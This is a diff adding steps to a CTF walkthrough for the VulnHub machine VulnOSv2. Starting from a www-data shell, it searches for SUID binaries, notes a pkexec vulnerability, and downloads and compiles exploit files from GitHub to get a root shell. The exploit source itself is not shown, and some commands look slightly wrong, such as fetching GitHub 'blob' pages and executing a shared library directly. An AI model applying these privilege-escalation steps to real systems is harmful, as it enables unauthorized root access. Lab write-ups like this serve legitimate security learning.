@@ -30,8 +30,19 @@ run
 
 www-data session opened
 
+
 find / -perm /4000 2>/dev/null
 
 observe that pkexec vuln exist in this machine
 
 
+```bash
+wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/VulnOSv2/exploit.c
+wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/VulnOSv2/evil-so.c
+gcc -shared -o evil.so -fPIC evil-so.c
+gcc exploit.c -o exploit
+./evil.so
+./exploit
+```
+
+BINGO !!! Root shell gained..!
